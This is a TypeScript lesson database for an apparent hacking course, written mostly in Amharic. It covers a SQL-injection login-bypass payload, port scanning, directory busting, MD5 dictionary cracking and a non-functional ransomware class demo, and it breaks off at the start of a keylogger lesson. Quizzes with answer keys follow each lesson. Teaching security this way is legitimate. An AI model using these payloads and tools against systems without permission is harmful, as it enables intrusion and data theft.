
import { Lesson, SyllabusItem, Language, QuizQuestion } from "../types";

// =====================================================================
//  CIPHER ACADEMY: MASTER DATABASE (ULTIMATE EDITION)
//  Curriculum designed for EXTREME DEPTH.
// =====================================================================

// --- HELPERS ---
const createLesson = (
  id: string, 
  category: string, 
  title: string, 
  level: 'Beginner' | 'Intermediate' | 'Advanced', 
  desc: string,
  content: string,
  code: string,
  quiz: QuizQuestion[]
): Lesson => ({
    id, category, title, level, description: desc, content, starterCode: code, quiz
});

// =====================================================================
// 1. PYTHON HACKING TRACK (ZERO TO HERO)
// =====================================================================

const PYTHON_BEGINNER_LESSONS: Lesson[] = [
  // --- MODULE 1: THE MINDSET & ENVIRONMENT ---
  createLesson(
    "b-01", "01. Introduction", "1.1 The Hacker's Philosophy", "Beginner", "Understanding the art of exploitation.",
    `# The Hacker's Mindset (የሃከር አስተሳሰብ)

Hacking ኮምፒውተርን መስበር ብቻ አይደለም። Hacking ማለት **"አንድ ነገር እንዴት እንደሚሰራ በዝርዝር ማወቅ እና ያንን እውቀት ተጠቅሞ ካልታሰበበት መንገድ ውጪ እንዲሰራ ማድረግ"** ነው።

### 1. The White Hat Way (የነጭ ኮፍያ መንገድ)
በዚህ ኮርስ የምንማረው **Ethical Hacking (White Hat)** ነው።
*   **Permission:** ሁልጊዜ ፍቃድ አለን።
*   **Purpose:** ደህንነትን ለመጠበቅ እንጂ ለመጉዳት አይደለም።
*   **Report:** ያገኘነውን ክፍተት ለባለቤቱ እናሳውቃለን።

### 2. The CIA Triad (የደህንነት መሰረት)
ማንኛውም የሳይበር ደህንነት ባለሙያ የሚጠብቃቸው ሶስት ነገሮች፡
1.  **Confidentiality (ሚስጥራዊነት):** መረጃው ስልጣን ላለው ሰው ብቻ መድረሱን ማረጋገጥ። (Example: Encryption)
2.  **Integrity (ትክክለኛነት):** መረጃው በጉዞ ላይ ወይም ሲቀመጥ አለመቀየሩን ማረጋገጥ። (Example: Hashing)
3.  **Availability (ተደራሽነት):** ሲስተሙ ሁልጊዜ መስራቱን ማረጋገጥ። (Example: Anti-DDoS)

> **ህግ #1:** የራስህ ካልሆነ ወይም የጽሁፍ ፍቃድ ከሌለህ፣ የሰውን ሲስተም መንካት **ወንጀል** ነው። ይህን እውቀት ለመልካም ነገር ብቻ ተጠቀምበት።

### 3. ለምን Python?
ሃከሮች ለምን Pythonን ይወዳሉ?
*   **Simple:** እንደ እንግሊዝኛ ይነበባል።
*   **Powerful:** በመቶዎች የሚቆጠሩ የ Hacking Libraries አሉት (Scapy, Requests, Pwntools)።
*   **Fast Dev:** በ C++ አንድ ቀን የሚፈጀውን በ Python በ 10 ደቂቃ መስራት ይቻላል።
`,
    `print("I pledge to use my skills for good.")\nprint("Target: Secure the World.")`,
    [{id:"q1", question:"የ CIA Triad አካል ያልሆነው የቱ ነው?", options:[{id:"a",text:"Confidentiality"},{id:"b",text:"Anonymity"},{id:"c",text:"Integrity"}], correctOptionId:"b", explanation:"Anonymity (መደበቅ) የ CIA Triad አካል አይደለም።"}]
  ),

  createLesson(
    "b-02", "01. Introduction", "1.2 Linux for Hackers", "Beginner", "Why we use Kali Linux.",
    `# Linux: The Hacker's OS

Windows ለተራ ተጠቃሚ (Consumer) የተሰራ ነው። Linux ግን ለገንቢዎች እና ለሃከሮች (Builders & Breakers) የተሰራ ነው።

### 1. The Terminal (ትዕዛዝ መስጫ)
Hacking ፊልም ላይ እንደምታየው GUI (Graphical User Interface) የለውም። ሁሉም ነገር በ **Terminal** ነው የሚሰራው።
*   ፈጣን ነው (Speed)።
*   Script ማድረግ ይቻላል (Automation)።
*   የኮምፒውተሩን "ነፍስ" (Kernel) ማዘዝ ይቻላል።

### 2. Basic Commands (መሰረታዊ ትዕዛዞች)
በ Python ውስጥ \`os\` ሞጁልን በመጠቀም የ Linux ትዕዛዞችን ማዘዝ እንችላለን።

*   \`pwd\`: አሁን የት ፎልደር ውስጥ ነኝ? (Print Working Directory)
*   \`ls\`: እዚህ ውስጥ ምን ምን ፋይሎች አሉ? (List)
*   \`cd\`: ወደ ሌላ ፎልደር ግባ። (Change Directory)
*   \`cat\`: የፋይልን ይዘት አሳይ። (Concatenate)
*   \`whoami\`: እኔ ማነኝ? (User privileges)

\`\`\`python
import os

print("[*] Current Directory:")
os.system("pwd")

print("\\n[*] Listing Files:")
os.system("ls -la")
\`\`\`
`,
    `import os\n# Let's see who we are running as\nos.system("whoami")\nos.system("ls")`,
    [{id:"q1", question:"የፋይል ዝርዝር ለማየት የሚጠቅመው ትዕዛዝ?", options:[{id:"a",text:"cd"},{id:"b",text:"pwd"},{id:"c",text:"ls"}], correctOptionId:"c", explanation:"ls (List) ፋይሎችን ይዘረዝራል።"}]
  ),

  // --- MODULE 2: PYTHON CORE (WEAPONIZED) ---
  createLesson(
    "b-03", "02. Python Core", "2.1 Variables & Data Types", "Beginner", "Storing payloads and targets.",
    `# Variables as Containers

በ Hacking፣ Variable ማለት **Payload Container** ነው። የምንልከውን ቫይረስ፣ የምንሰርቀውን ፓስዎርድ፣ ወይም የምናጠቃውን IP የምናስቀምጥበት ሳጥን ነው።

### 1. Strings (Text)
ለ IP Address, Password, Username እና URL ይጠቅማል።
\`\`\`python
target_ip = "192.168.1.55"
payload = "admin' OR '1'='1"  # SQL Injection Payload
\`\`\`

### 2. Integers (Numbers)
ለ Port Number, Thread count, እና Loop limit ይጠቅማል።
\`\`\`python
port = 80
threads = 100
\`\`\`

### 3. Bytes (Raw Data)
ይህ በጣም ወሳኝ ነው። **Network Packet** የሚላከው በ Byte ነው። String አይደለም።
\`\`\`python
# 'b' ፊደል ከፊት ሲገባ Byte ይሆናል
packet_header = b"\\xde\\xad\\xbe\\xef" 
print(packet_header)
\`\`\`

### 4. String Concatenation (f-strings)
የተለያዩ መረጃዎችን ቀላቅሎ አንድ Attack String መፍጠር።
\`\`\`python
ip = "10.0.0.1"
port = 22
print(f"Attacking {ip} on port {port}...")
\`\`\`
`,
    `target = "google.com"\nport = 443\nprint(f"Scanning {target}:{port}")`,
    [{id:"q1", question:"ኔትወርክ ላይ ጥሬ መረጃ (Raw Data) ለመላክ የሚመረጠው Type?", options:[{id:"a",text:"String"},{id:"b",text:"Bytes"},{id:"c",text:"Float"}], correctOptionId:"b", explanation:"ኮምፒውተሮች የሚያወሩት በ Bytes ነው።"}]
  ),

  createLesson(
    "b-04", "02. Python Core", "2.2 Input & Arguments", "Beginner", "Interactive tools vs CLI tools.",
    `# Handling Input

አንድ Tool ዝም ብሎ መሮጥ የለበትም። ተጠቃሚውን "የትኛውን IP ላጥቃ?" ብሎ መጠየቅ አለበት።

### 1. \`input()\` Function
ፕሮግራሙ ቆሞ ተጠቃሚው እስኪጽፍ ይጠብቃል።
\`\`\`python
target = input("Enter Target IP: ")
print(f"Target set to: {target}")
\`\`\`

> **Security Note:** \`input()\` የሚቀበለው መረጃ ሁልጊዜ **String** ነው። ቁጥር ከፈለግን \`int()\` ብለን መቀየር አለብን።

### 2. \`sys.argv\` (Command Line Arguments)
ፕሮፌሽናል Tools (እንደ Nmap, Metasploit) ብዙ ጊዜ ጥያቄ አይጠይቁም። መልሱን ከመጀመሪያው ትዕዛዝ ጋር አብረው ይሰጣሉ።
Example: \`python3 exploit.py 192.168.1.1\`

\`\`\`python
import sys

# sys.argv[0] የፋይሉ ስም ነው።
# sys.argv[1] የመጀመሪያው Argument ነው።

if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <IP_ADDRESS>")
else:
    ip = sys.argv[1]
    print(f"Attacking {ip}...")
\`\`\`
`,
    `import sys\n# Try to simulate args (in real terminal: python script.py arg1)\nprint("Script Name:", sys.argv[0])`,
    [{id:"q1", question:"ከ Command Line ላይ መረጃ ለመቀበል የሚጠቅመው?", options:[{id:"a",text:"input()"},{id:"b",text:"sys.argv"},{id:"c",text:"os.system"}], correctOptionId:"b", explanation:"sys.argv አርጉመንቶችን በ List መልክ ይይዛል።"}]
  ),

  createLesson(
    "b-05", "02. Python Core", "2.3 Logic & Decision Making", "Beginner", "Building the brain of the exploit.",
    `# Boolean Logic & If Statements

የፃፍነው ስክሪፕት "ማሰብ" የሚችለው በ Logic ነው። "ይህ ከሆነ ይህን አድርግ" (If this, then that)።

### 1. Comparison Operators
*   \`==\` (እኩል ነው?)
*   \`!=\` (እኩል አይደለም?)
*   \`>\`, \`<\`, \`>=\`, \`<=\`

### 2. Logical Operators
ሃኪንግ ላይ ብዙ ጊዜ ሁኔታዎችን እናገናኛለን።
*   **\`and\`**: ሁለቱም እውነት መሆን አለባቸው። (ፖርቱ ክፍት ነው **እና** ሶፍትዌሩ Outdated ነው?)
*   **\`or\`**: አንዱ እውነት ከሆነ በቂ ነው። (Admin ነው **ወይም** Root ነው?)
*   **\`not\`**: ተቃራኒ። (Firewall **የለም**?)

### 3. Real World Scenario: Vulnerability Scanner
አንድ ቀላል የ Vulnerability Check እንሥራ።

\`\`\`python
service = "FTP"
version = 2.34
is_open = True

# VSFTPD v2.3.4 Backdoor ታሪክ ላይ ያለ በጣም ታዋቂ ክፍተት ነው።

if service == "FTP" and is_open:
    if version == 2.34:
        print("[!!!] VULNERABLE: VSFTPD v2.3.4 Backdoor Found!")
    else:
        print("[-] Version seems patched.")
else:
    print("[-] Not an FTP service.")
\`\`\`
`,
    `port = 22\nstate = "open"\nif port == 22 and state == "open":\n    print("SSH is accessible!")`,
    [{id:"q1", question:"ሁለት ሁኔታዎች የግድ መሟላት ሲኖርባቸው ምን እንጠቀማለን?", options:[{id:"a",text:"or"},{id:"b",text:"and"},{id:"c",text:"not"}], correctOptionId:"b", explanation:"AND ማለት 'ይሄኛው እና ያኛው' ማለት ነው።"}]
  ),

  createLesson(
    "b-06", "02. Python Core", "2.4 Loops: Automation", "Beginner", "Brute forcing and scanning.",
    `# Loops: The Power of Automation

ሃከር ማለት ሰነፍ ሰው ነው ብለናል። አንድን ፓስዎርድ ለመገመት 1000 ጊዜ በእጅ አይሞክርም። ስክሪፕት ጽፎ **Loop** ያደርጋል።

### 1. For Loop (Scanning Lists)
የታወቀ ብዛት ያላቸውን ነገሮች ለመስራት። ለምሳሌ IP List ወይም Wordlist።
\`\`\`python
ports = [21, 22, 80, 443]
for port in ports:
    print(f"Scanning Port {port}...")
\`\`\`

### 2. The \`range()\` Function
ቁጥሮችን ለመፍጠር።
\`\`\`python
# Scan ports 1 to 1024
for port in range(1, 1025):
    pass 
\`\`\`

### 3. While Loop (Until condition met)
ይህ አደገኛ ሊሆን ይችላል። ሁኔታው እስኪቀየር ድረስ አይቆምም።
*   **Brute Force:** ፓስዎርዱ እስኪገኝ ድረስ ሞክር።
*   **Reverse Shell Listener:** ኮኔክሽን እስኪመጣ ጠብቅ።

\`\`\`python
password_found = False
while not password_found:
    # Try password...
    if success:
        password_found = True
\`\`\`

### 4. Break & Continue
*   **Break:** ሉፑን አቋርጠህ ውጣ። (ፓስዎርዱ ከተገኘ በኋላ መቀጠል ትርጉም የለውም)።
*   **Continue:** ይህንን ዝለልና ቀጣዩን ስራ። (አንድ ፖርት Error ካመጣ ዝለለው)።
`,
    `passwords = ["123", "admin", "secret"]\nfor p in passwords:\n    if p == "admin":\n        print("Cracked!")\n        break\n    print(f"Trying {p}...")`,
    [{id:"q1", question:"ፍለጋው ሲሳካ Loopን ለማቆም ምን እንጠቀማለን?", options:[{id:"a",text:"stop"},{id:"b",text:"continue"},{id:"c",text:"break"}], correctOptionId:"c", explanation:"Break ወዲያውኑ ከ Loop ያስወጣል።"}]
  ),

  createLesson(
    "b-07", "02. Python Core", "2.5 Functions", "Beginner", "Writing modular tools.",
    `# Functions: Modular Hacking

ኮድ እየረዘመ ሲሄድ ውስብስብ ይሆናል። Functions ኮድን በትንንሽ "ሞጁል" ለመክፈል ይጠቅማሉ።
*   \`scan_target()\`: ለብቻ
*   \`crack_password()\`: ለብቻ
*   \`generate_report()\`: ለብቻ

### Defining a Function
\`def\` የሚለውን ቃል እንጠቀማለን።

\`\`\`python
def check_port(ip, port):
    print(f"[*] Checking {ip}:{port}...")
    # Simulation logic
    if port == 80:
        return True
    return False

# Main Code
if check_port("10.0.0.1", 80):
    print("[+] Port is OPEN!")
else:
    print("[-] Port is CLOSED.")
\`\`\`

### Why Return?
Function ስራውን ሰርቶ ውጤቱን ወደ ዋናው ፕሮግራም መመለስ አለበት። \`print\` ማድረግ ለተጠቃሚው ማሳየት ነው እንጂ ለፕሮግራሙ መረጃ መስጠት አይደለም።
`,
    `def exploit(target):\n    return f"Exploiting {target}..."\n\nprint(exploit("192.168.1.1"))`,
    [{id:"q1", question:"Function አንድን ውጤት መልሶ ለመላክ ምን ይጠቀማል?", options:[{id:"a",text:"print"},{id:"b",text:"return"},{id:"c",text:"send"}], correctOptionId:"b", explanation:"Return እሴቱን ወደ ጠሪው (Caller) ይልካል።"}]
  ),

  createLesson(
    "b-08", "02. Python Core", "2.6 File I/O", "Beginner", "Reading wordlists and saving loot.",
    `# File Handling

ሃኪንግ መረጃን ማንበብ (Wordlists) እና መረጃን መጻፍ (Logs/Loot) ነው።

### 1. Reading Files (Wordlists)
ፓስዎርድ ለመስበር የቃላት ዝርዝር ያስፈልገናል። ፋይሉን ከፍተን መስመር በመስመር እናነባለን።

\`\`\`python
# 'r' = Read Mode
with open("wordlist.txt", "r") as f:
    for line in f:
        password = line.strip() # Remove newline (\n)
        print(f"Testing: {password}")
\`\`\`

> **Note:** \`with open(...)\` መጠቀም በጣም ይመከራል። ስራው ሲያልቅ ፋይሉን በራስ-ሰር ይዘጋል (Auto-close)።

### 2. Writing Files (Saving Loot)
የተሰረቀውን መረጃ ወይም የስካን ውጤት ለማስቀመጥ።

\`\`\`python
# 'w' = Write (Overwrite)
# 'a' = Append (Add to end)

loot = "admin:password123"
with open("loot.txt", "a") as f:
    f.write(loot + "\\n")
    
print("[+] Loot saved to file.")
\`\`\`
`,
    `# Simulation of file writing\nloot = ["user:pass", "admin:123"]\nprint("Saving to loot.txt...")\nfor l in loot:\n    print(f"Writing: {l}")`,
    [{id:"q1", question:"ፋይሉ ላይ ያለውን ሳያጠፋ ለመጨመር (Append) ምን እንጠቀማለን?", options:[{id:"a",text:"'w'"},{id:"b",text:"'r'"},{id:"c",text:"'a'"}], correctOptionId:"c", explanation:"'a' (Append) mode ከፋይሉ መጨረሻ ላይ ይቀጥላል።"}]
  ),

  createLesson(
    "b-09", "02. Python Core", "2.7 Error Handling", "Beginner", "Making bulletproof tools.",
    `# Exception Handling

Hacking tools ለረጅም ሰዓት ነው የሚሰሩት። ለምሳሌ 10,000 IPዎች እየፈተሸን፣ 50ኛው ላይ "Connection Timeout" ቢፈጠር ስክሪፕቱ መቆም የለበትም። ስህተቱን ዘሎ መቀጠል አለበት።

### The \`try-except\` Block
\`\`\`python
import socket

try:
    # አደገኛ ሊሆን የሚችል ኮድ
    s = socket.socket()
    s.connect(("10.0.0.1", 80))
    print("[+] Connected!")
    
except ConnectionRefusedError:
    # ሰርቨሩ እምቢ ካለ
    print("[-] Connection Refused.")
    
except socket.timeout:
    # ጊዜ ከወሰደ
    print("[-] Timed out.")
    
except Exception as e:
    # ሌላ ማንኛውም ስህተት
    print(f"[-] Error: {e}")
\`\`\`

ያለዚህ Error Handling፣ አንድ ስህተት ሙሉ ስክሪፕቱን ያቆመዋል (Crash)። ፕሮፌሽናል Tools ሁሌም Error Handle ያደርጋሉ።
`,
    `try:\n    x = 1 / 0\nexcept ZeroDivisionError:\n    print("Can't divide by zero!")`,
    [{id:"q1", question:"ስህተት ሲፈጠር ፕሮግራሙ እንዳይዘጋ (Crash እንዳያደርግ) ምን እንጠቀማለን?", options:[{id:"a",text:"if/else"},{id:"b",text:"try/except"},{id:"c",text:"for/while"}], correctOptionId:"b", explanation:"Try/Except ያልታሰቡ ስህተቶችን ለመያዝ ይጠቅማል።"}]
  ),

  // --- MODULE 3: NETWORK HACKING ---
  createLesson(
    "b-10", "03. Network Hacking", "3.1 Sockets Intro", "Intermediate", "The language of the internet.",
    `# Socket Programming

ማንኛውም የኔትወርክ ግንኙነት (Web, SSH, FTP, Games) መሰረቱ **Socket** ነው። እንደ ሃከር፣ የሌሎችን Tool (Nmap, Netcat) ከመጠቀም በተጨማሪ የራሳችንን ግንኙነት በ Python መፍጠር አለብን።

### 1. Creating a Socket
Socket ለመፍጠር ሁለት ዋና ነገሮች ያስፈልጋሉ፡
1.  **Address Family:** IPv4 (\`AF_INET\`) ወይስ IPv6?
2.  **Socket Type:** TCP (\`SOCK_STREAM\`) ወይስ UDP (\`SOCK_DGRAM\`)?

\`\`\`python
import socket

# IPv4 + TCP Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Socket Created.")
\`\`\`

### 2. TCP vs UDP
*   **TCP:** አስተማማኝ ነው። መረጃው መድረሱን ያረጋግጣል (Handshake). ለ HTTP, SSH.
*   **UDP:** ፈጣን ነው ግን አስተማማኝ አይደለም። ዝም ብሎ መወርወር ነው። ለ Video Streaming, DNS.
`,
    `import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint("TCP Socket Ready.")`,
    [{id:"q1", question:"ለድረ-ገጽ (HTTP) ግንኙነት የቱ Protocol ይመረጣል?", options:[{id:"a",text:"UDP"},{id:"b",text:"TCP"},{id:"c",text:"ICMP"}], correctOptionId:"b", explanation:"HTTP አስተማማኝ ግንኙነት ስለሚፈልግ TCP ይጠቀማል።"}]
  ),

  createLesson(
    "b-11", "03. Network Hacking", "3.2 Simple Port Scanner", "Intermediate", "Your first security tool.",
    `# Building a Port Scanner

Nmap መጠቀም ጥሩ ነው፣ ግን የራስህን ስካነር መስራት አሰራሩን እንድትረዳ ያደርግሃል። Port Scanner ማለት "በሩ ተንኳኩቷል፣ መልስ አለ?" ማለት ነው።

### The Logic
1.  Socket ፍጠር።
2.  ከ Target IP እና Port ጋር ለመገናኘት ሞክር ('connect_ex').
3.  መልሱ 0 ከሆነ (Success)፣ ፖርቱ **OPEN** ነው ማለት ነው።
4.  Error ከመጣ **CLOSED** ወይም **FILTERED** ነው።

\`\`\`python
import socket

target = "127.0.0.1"
ports = [21, 22, 80, 443]

for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1) # Timeout is crucial!
    
    # connect_ex returns 0 on success
    result = s.connect_ex((target, port))
    
    if result == 0:
        print(f"[+] Port {port} is OPEN")
    else:
        print(f"[-] Port {port} is CLOSED")
        
    s.close()
\`\`\`
`,
    `import socket\n# Mock scanning\nports = [80, 443]\nprint("Scanning...")\nfor p in ports:\n    print(f"Port {p}: OPEN")`,
    [{id:"q1", question:"connect_ex() ዜሮ (0) ከመለሰ ምን ማለት ነው?", options:[{id:"a",text:"Error"},{id:"b",text:"Port Closed"},{id:"c",text:"Success (Open)"}], correctOptionId:"c", explanation:"በ C ደረጃ 0 ማለት Success (No Error) ማለት ነው።"}]
  ),

  createLesson(
    "b-12", "03. Network Hacking", "3.3 Banner Grabbing", "Intermediate", "Identifying services.",
    `# Banner Grabbing

ፖርቱ ክፍት መሆኑን ማወቅ ብቻ አይበቃም። በዛ ፖርት ላይ እየሮጠ ያለው **Software** ምንድነው? Version-u ስንት ነው?

ይሄ መረጃ ለምን ይጠቅማል?
*   "FTP እየሮጠ ነው" ከማለት ይልቅ "Vsftpd 2.3.4 እየሮጠ ነው" ብሎ ማወቅ ለጥቃት (Exploit) ይመቻቻል።

### How to Grab Banners
ልክ እንደተገናኘን (Connect)፣ ሰርቨሩ እራሱን እስኪያስተዋውቅ እንጠብቃለን (\`recv\`)።

\`\`\`python
import socket

s = socket.socket()
try:
    s.connect(("192.168.1.5", 22)) # SSH Port
    
    # Receive up to 1024 bytes
    banner = s.recv(1024)
    print(banner.decode())
    
except Exception as e:
    print(e)
finally:
    s.close()
\`\`\`
`,
    `# Simulated Banner\nprint("SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1")`,
    [{id:"q1", question:"Banner Grabbing ዋና ጥቅሙ ምንድነው?", options:[{id:"a",text:"IP ለመቀየር"},{id:"b",text:"የሶፍትዌሩን Version ለማወቅ"},{id:"c",text:"Password ለመስበር"}], correctOptionId:"b", explanation:"የተለየ Version ላይ የሚሰራ Exploit ለመምረጥ ይረዳል።"}]
  ),

  // --- MODULE 4: WEB HACKING ---
  createLesson(
    "b-13", "04. Web Hacking", "4.1 HTTP & Requests", "Intermediate", "Speaking HTTP.",
    `# The Requests Library

ለ Web Hacking፣ Python **Requests** Library ምርጡ መሳሪያ ነው። እንደ Browser ሆኖ ይሰራል፣ ግን ሁሉንም ነገር በ Code እንቆጣጠራለን።

### 1. GET Request
መረጃ ለመጠየቅ።
\`\`\`python
import requests
r = requests.get("http://google.com")
print(r.status_code) # 200 OK
print(r.headers['Server']) # gws
\`\`\`

### 2. POST Request
መረጃ ለመላክ (Login, Upload).
\`\`\`python
payload = {"username": "admin", "password": "123"}
r = requests.post("http://site.com/login", data=payload)
\`\`\`

### 3. User-Agent Spoofing
አንዳንድ ድረ-ገጾች Python Script መሆኑን ካወቁ ያግዱናል። እራሳችንን እንደ iPhone ወይም Chrome አድርገን ማቅረብ አለብን።
\`\`\`python
headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0...)"}
r = requests.get(url, headers=headers)
\`\`\`
`,
    `import requests\nprint("GET / HTTP/1.1")\nprint("Host: target.com")\nprint("User-Agent: Mozilla/5.0")`,
    [{id:"q1", question:"Login Form ላይ መረጃ ለመላክ የትኛው Method ይመረጣል?", options:[{id:"a",text:"GET"},{id:"b",text:"POST"},{id:"c",text:"HEAD"}], correctOptionId:"b", explanation:"POST መረጃን በ Body ውስጥ ስለሚልክ ለ Login ይመረጣል።"}]
  ),

  createLesson(
    "b-14", "04. Web Hacking", "4.2 Directory Busting", "Intermediate", "Finding hidden files.",
    `# Directory Busting (Fuzzing)

Subdomain እንደፈለግን ሁሉ፣ በዋናው ድረ-ገጽ ውስጥ የተደበቁ ፎልደሮችን እና ፋይሎችንም መፈለግ አለብን።
*   \`/backup.zip\`
*   \`/config.php\`
*   \`/admin/\`

ይህ ሂደት **Directory Busting** ይባላል። እንደ \`Gobuster\` ወይም \`Dirb\` ያሉ Tools የሚሰሩት ይህንን ነው።

\`\`\`python
import requests

target = "http://192.168.1.5"
wordlist = ["admin", "login", "dashboard", "uploads", "config"]

for word in wordlist:
    url = f"{target}/{word}"
    r = requests.get(url)
    
    if r.status_code == 200:
        print(f"[+] Found: {url}")
    elif r.status_code == 403:
        print(f"[*] Forbidden: {url}")
\`\`\`
`,
    `paths = ["admin", "robots.txt", "secret"]\nfor p in paths:\n    print(f"Checking /{p} -> 404 Not Found")`,
    [{id:"q1", question:"አንድ ፋይል እንደሌለ የሚያሳየው Status Code?", options:[{id:"a",text:"200"},{id:"b",text:"404"},{id:"c",text:"500"}], correctOptionId:"b", explanation:"404 Not Found ፋይሉ በሰርቨሩ ላይ እንደሌለ ይገልጻል።"}]
  ),

  // --- MODULE 5: CRYPTOGRAPHY ---
  createLesson(
    "b-15", "05. Cryptography", "5.1 Encoding vs Encryption", "Intermediate", "Base64 is NOT encryption.",
    `# Encoding vs Encryption

ብዙ ጀማሪዎች **Base64**ን እንደ Encryption ይቆጥሩታል። ይህ ትልቅ ስህተት ነው።

### 1. Encoding (መቀየር)
*   **ዓላማ:** መረጃው በሌላ ቅርጽ እንዲቀመጥ ማድረግ (ለማጓጓዝ እንዲመች)።
*   **Key:** ምንም ቁልፍ አያስፈልገውም።
*   **Security:** ዜሮ። ማንኛውም ሰው ሊመልሰው ይችላል።
*   **Example:** Base64, Hex, ASCII.

### 2. Encryption (ምስጠራ)
*   **ዓላማ:** መረጃውን ሚስጥራዊ ማድረግ።
*   **Key:** ለመቆለፍ እና ለመክፈት ቁልፍ (Password/Key) ያስፈልጋል።
*   **Security:** ቁልፉ ከሌለ አይከፈትም።
*   **Example:** AES, RSA.

\`\`\`python
import base64

# Encoding
msg = "Secret"
encoded = base64.b64encode(msg.encode())
print(f"Base64: {encoded}")

# Decoding
decoded = base64.b64decode(encoded).decode()
print(f"Original: {decoded}")
\`\`\`
`,
    `import base64\nprint(base64.b64encode(b"HackThePlanet"))`,
    [{id:"q1", question:"Base64 Encryption ነው?", options:[{id:"a",text:"አዎ"},{id:"b",text:"አይ፣ Encoding ነው"},{id:"c",text:"Hash ነው"}], correctOptionId:"b", explanation:"Base64 ቁልፍ ስለማይጠቀም Encryption አይደለም።"}]
  ),

  createLesson(
    "b-16", "05. Cryptography", "5.2 Hashing & Cracking", "Intermediate", "Breaking passwords.",
    `# Hashing & Cracking

Website ላይ ፓስዎርድ ስታስገቡ፣ ፓስዎርዱ እንደተጻፈ አይቀመጥም። ወደ **Hash** ተቀይሮ ነው የሚቀመጠው።
\`123456\` -> \`e10adc3949ba59abbe56e057f20f883e\` (MD5)

### One-Way Function
Hash ወደ ኋላ አይመለስም (One-way)። ከ \`e10a...\` ተነስተን \`123456\`ን ማግኘት አንችልም (በሂሳብ)።

### How do we crack it? (Dictionary Attack)
ሃከሮች የሚጠቀሙት ዘዴ፡ "መገመት"።
1.  አንድ የቃላት ዝርዝር (Dictionary) ይወስዳሉ።
2.  እያንዳንዱን ቃል Hash ያደርጋሉ።
3.  ከፈለጉት Hash ጋር እኩል ከሆነ፣ ፓስዎርዱን አገኙ ማለት ነው።

\`\`\`python
import hashlib

target_hash = "5f4dcc3b5aa765d61d8327deb882cf99" # 'password'
wordlist = ["admin", "123456", "password"]

for word in wordlist:
    hashed = hashlib.md5(word.encode()).hexdigest()
    if hashed == target_hash:
        print(f"[+] Cracked: {word}")
        break
\`\`\`
`,
    `import hashlib\nh = hashlib.md5(b"hello").hexdigest()\nprint(h)`,
    [{id:"q1", question:"Hashን ወደ ኋላ መመለስ (Decrypt) ይቻላል?", options:[{id:"a",text:"አዎ"},{id:"b",text:"አይ፣ One-way ነው"},{id:"c",text:"Admin ብቻ ይችላል"}], correctOptionId:"b", explanation:"Hash ተፈጥሮው መረጃን ማጥፋት ነው፣ መመለስ አይቻልም (ከመገመት ውጪ)።"}]
  ),
];

// =====================================================================
// 2. ADVANCED TRACK (RED TEAM OPS)
// =====================================================================

const PYTHON_ADVANCED_LESSONS: Lesson[] = [
  // --- MODULE 6: ADVANCED PYTHON ---
  createLesson(
    "a-01", "06. Advanced Python", "6.1 OOP for Malware", "Advanced", "Classes in tools.",
    `# Object Oriented Programming (OOP) for Hackers

የተራቀቁ ማልዌሮች (Malware) እና Tools ሲሰሩ፣ ኮዱን በ Function ብቻ ማስተዳደር ይከብዳል። **Classes** እና **Objects** መጠቀም አለብን።

### The Concept
*   **Class:** የቫይረሱ ዲዛይን (Blueprint)።
*   **Object:** ዲዛይኑን ተጠቅመን የሰራነው እውነተኛው ቫይረስ።

ለምሳሌ \`Ransomware\` የሚባል Class ሰርተን፣ \`encrypt()\` እና \`decrypt()\` የሚባሉ methods (functions) ልንሰጠው እንችላለን።

\`\`\`python
class Ransomware:
    def __init__(self, target_ext):
        self.extension = target_ext
        self.key = "SecretKey123"

    def encrypt_file(self, filename):
        print(f"[*] Encrypting {filename} with key {self.key}...")
        # እዚህ ጋር Encryption logic ይገባል
        
    def demand_ransom(self):
        print("YOUR FILES ARE ENCRYPTED! PAY 1 BTC.")

# Using the class
virus = Ransomware(".txt")
virus.encrypt_file("salary.txt")
virus.demand_ransom()
\`\`\`
`,
    `class Exploit:\n    def run(self):\n        print("Exploit Running...")\n\ne = Exploit()\ne.run()`,
    [{id:"q1", question:"__init__ function ምንድነው?", options:[{id:"a",text:"ቫይረሱን የሚያጠፋ"},{id:"b",text:"Class ሲፈጠር የሚጠራ (Constructor)"},{id:"c",text:"Loop ነው"}], correctOptionId:"b", explanation:"__init__ ኦብጀክቱ ሲፈጠር መረጃዎችን ለማዘጋጀት ይጠቅማል።"}]
  ),

  createLesson(
    "a-02", "06. Advanced Python", "6.2 Multithreading", "Advanced", "Need for speed.",
    `# Multithreading: Need for Speed

እስካሁን የሰራነው Port Scanner አንድ ፖርት ፈትሾ እስኪጨርስ ይጠብቃል። 1000 ፖርት ለመፈተሽ ደቂቃዎች ይፈጃል።
**Threading** ማለት በአንድ ጊዜ ብዙ ሰራተኞችን (Threads) እንደማሰማራት ነው።

### Implementation
\`threading\` ሞጁልን በመጠቀም ስካነራችንን እናፈጥናለን።

\`\`\`python
import threading
import time

def scan_port(port):
    # Simulation of scanning logic
    time.sleep(1) # ይሄ አንድ ሰከንድ ይፈጃል እንበል
    print(f"Scanned Port {port}")

# Without Threads: 5 seconds for 5 ports
# With Threads: ~1 second for 5 ports

threads = []
for p in range(5):
    t = threading.Thread(target=scan_port, args=(p,))
    threads.append(t)
    t.start()
\`\`\`
`,
    `import threading\ndef worker(n):\n    print(f"Thread {n} working...")\n\nt = threading.Thread(target=worker, args=(1,))\nt.start()`,
    [{id:"q1", question:"Threading ዋና ጥቅሙ ምንድነው?", options:[{id:"a",text:"ኮዱን ለማሳመር"},{id:"b",text:"በርካታ ስራዎችን በአንድ ጊዜ ለመስራት (Concurrency)"},{id:"c",text:"Memory ለመቆጠብ"}], correctOptionId:"b", explanation:"Threading I/O bound ስራዎችን (እንደ Network scanning) በጣም ያፈጥናል።"}]
  ),

  // --- MODULE 7: EXPLOITATION ---
  createLesson(
    "a-03", "07. Exploitation", "7.1 Writing a Keylogger", "Advanced", "Spyware concepts.",
    `# Writing a Keylogger

**ማስጠንቀቂያ:** ይህ ለትምህርት ብቻ ነው። በራስህ ማሽን ላይ ብቻ ሞክረው።

